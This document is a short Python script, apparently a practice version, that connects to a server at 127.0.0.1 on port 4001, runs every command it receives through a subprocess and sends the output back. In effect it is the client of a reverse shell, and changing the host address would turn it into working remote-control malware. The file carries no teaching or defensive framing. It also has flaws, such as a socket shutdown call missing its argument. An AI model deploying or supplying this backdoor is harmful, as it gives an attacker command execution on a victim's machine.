#!/usr/bin/python3
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST = '127.0.0.1'
PORT = 4001

def sock_exit(msg):
    print(msg)
    exit(1)

def receive():
    while True:
        try:
            data = s.recv(1024).decode('utf-8')

            if not data or data == 'q':
                s.shutdown()
                s.close()

            print(f'Received from server: {data}')

            output = handle(data)

            send(output)
        except:
            sock_exit('Failed to receive from server')

def send(output):
    try:
        s.send(output.encode('utf-8'))
    except:
        sock_exit('Failed to send data to server')

def handle(command):
    p = subprocess.getstatusoutput(command)
    return p[1]

def main():
    try:
        s.connect((HOST, PORT))
        print('Client started')
        while True:
            receive()
    except:
        print('Failed to connect to server')

if __name__ == '__main__':
    main()
